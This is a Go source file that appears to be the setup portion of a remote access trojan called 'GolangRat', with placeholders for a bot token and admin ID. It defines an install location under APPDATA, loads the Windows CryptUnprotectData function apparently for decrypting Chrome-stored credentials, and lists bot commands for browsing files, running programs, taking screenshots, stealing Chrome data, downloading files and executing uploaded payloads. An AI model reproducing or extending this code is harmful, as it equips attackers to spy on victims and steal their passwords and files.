package main

import (
	"os"
	"syscall"
	"unsafe"
)

type IpConfig struct {
	Ip         string
	Ip_decimal uint
	Country    string
	City       string
	Hostname   string
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

var (
	nameFile                  string = "golangrat"
	botDir                    string = "GolangRat"
	appdataDir                string = os.Getenv("APPDATA")
	fullPathBotDir            string = appdataDir + "\\" + botDir
	fullPathBotExecFile       string = fullPathBotDir + "\\" + nameFile + ".exe"
	fullPathBotSourceExecFile string = os.Args[0]
	pwd                       string = os.Args[0]
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
	//procEncryptData = dllcrypt32.NewProc("CryptProtectData")
	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

const(
	ADMIN_ID = 123456 //change this
	BOT_TOKEN = "<TOKEN>" //and this
	HELP = "/pwd\n" +
	"/ls <directory>\n" +
	"/cd <directory>\n" +
	"/run <path>\n" +
	"/info\n" +
	"/uninstall\n" +
	"/screen\n" +
	"/chrome\n" +
		"/dl <path to file>\n" +
	"/to <hostname/ip> <command>" +
	"simply send me file with text \"exec\" to execute it"
)
